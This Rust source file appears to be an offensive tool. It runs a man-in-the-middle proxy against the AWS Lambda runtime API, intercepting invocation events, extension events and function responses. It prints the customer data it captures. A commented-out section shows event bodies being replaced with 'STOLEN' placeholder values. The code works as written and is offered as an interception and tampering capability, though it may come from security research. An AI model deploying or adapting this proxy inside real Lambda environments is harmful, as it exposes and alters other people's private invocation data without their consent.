
use std::str::FromStr;
use std::{
    convert::Infallible,
    net::SocketAddr
};

use crate::cverror::{NetResult};

use hyper::{Body, Request, Response, Client, Uri, Server};
use hyper::service::{make_service_fn, service_fn};
use hyper::{Method};
use hyper::header::{
    HeaderValue,
    HOST
};
use hyper::body;

use serde_json::{Value};


// At the time of writing this, rapid will always listen on this IP and port
const RAPID_HOST: &str = "127.0.0.1:9001";

async fn send_req(mut req: Request<Body>) -> NetResult<Response<Body>> {
    
    req.headers_mut().insert(HOST, HeaderValue::from_static(RAPID_HOST));

    let req_uri = {
        format!(
            "http://{}{}",
            RAPID_HOST,
            req.uri().path()
        )
    };

    *req.uri_mut() = Uri::from_str(req_uri.as_str()).unwrap();

    let client = Client::new();
    let resp = client.request(req).await?;

    Ok(resp)
}

/// Start a MITM API server to intercept requests/responses from
/// the Rapid init process
pub async fn start_api_svr(port: u16) {
    let addr = SocketAddr::from(([127, 0, 0, 1], port));

    // A `Service` is needed for every connection, so this
    // creates one from our `rapid_proxy` function.
    let make_svc = make_service_fn(|_conn| async {
        // service_fn converts our function into a `Service`
        Ok::<_, Infallible>(service_fn(rapid_proxy))
    });

    let server = Server::bind(&addr).serve(make_svc);

    if let Err(e) = server.await {
        eprintln!("server error: {}", e);
    }
}

/// Intercept requests for new invocation events as well as extension events
/// The raw body containing the customer specific data can then be modified or inspected
async fn hook_next(req: Request<Body>, is_evt: bool) -> NetResult<Response<Body>> {
    let (parts, body) = send_req(req).await.unwrap().into_parts();
    let data = body::to_bytes(body).await.unwrap();

    let evt_json: Value = serde_json::from_slice(&data[..])?;

    if is_evt {
        // For now, just print the captured event
        println!("Captured Invoke Headers: {:#?}", parts.headers);
        println!("Captured Invoke Data: {}", serde_json::to_string_pretty(&evt_json)?);
    } else {
        println!("Captured Extension Headers: {:#?}", parts.headers);
        println!("Captured Invoke Data: {}", serde_json::to_string_pretty(&evt_json)?);
    }

    // // The Lambda event object can easily be modified here
    // let new_body = json!(
    //     {
    //         "STOLEN1":"VAL1",
    //         "STOLEN2":"VAL2",
    //         "STOLEN3":"VAL3",
    //     }
    // );
    // let body_len = format!("{}", new_body.to_string().len());
    // parts.headers.insert("content-length", HeaderValue::from_str(body_len.as_str())?);
    // let resp = Response::from_parts(parts, Body::from(new_body.to_string()));

    let resp = Response::from_parts(parts, Body::from(data));

    Ok(resp)
}

/// Intercept responses sent by the customer Lambda code
/// This can be altered before sending back to the rapid api server
async fn hook_response(req: Request<Body>) -> NetResult<Response<Body>> {

    let (parts, body) = req.into_parts();

    let hdr = parts.headers.clone();
    let data = body::to_bytes(body).await.unwrap();

    // The Lambda response object can be modified here

    // For now, just print the captured response
    println!("Captured Resp Headers: {:?}", hdr);
    println!("Captured Resp Event: {:?}", data);

    let newreq = Request::from_parts(parts, Body::from(data));

    let resp = send_req(newreq).await.unwrap();
    Ok(resp)
}

/// Proxy all rapid API HTTP requests so they can be inspected or modified
async fn rapid_proxy(req: Request<Body>) -> Result<Response<Body>, Infallible> {

    let path = req.uri().path();

    match req.method() {
        &Method::GET => {
            match path {
                // Capture runtime invocation events
                "/2018-06-01/runtime/invocation/next" => {
                    let resp = hook_next(req, true).await.unwrap();
                    return Ok(resp);
                }
                // Capture extension notification events
                "/2020-01-01/extension/event/next" => {
                    let resp = hook_next(req, false).await.unwrap();
                    return Ok(resp);
                }
                _default => {
                    // If this URI is unknown, just pass the request along to rapid
                }
            }
        }
        &Method::POST => {
            // Runtime is sending us a completion response
            if path.starts_with("/2018-06-01/runtime/invocation/") && path.ends_with("/response") {
                let resp = hook_response(req).await.unwrap();
                return Ok(resp);
            }
            // TODO: Hook error events?
        }
        _default => {
            // Just pass the request along to rapid
        }
    };

    // Send the request to the rapid init process
    let resp = send_req(req).await.unwrap();
    
    Ok(resp)
}
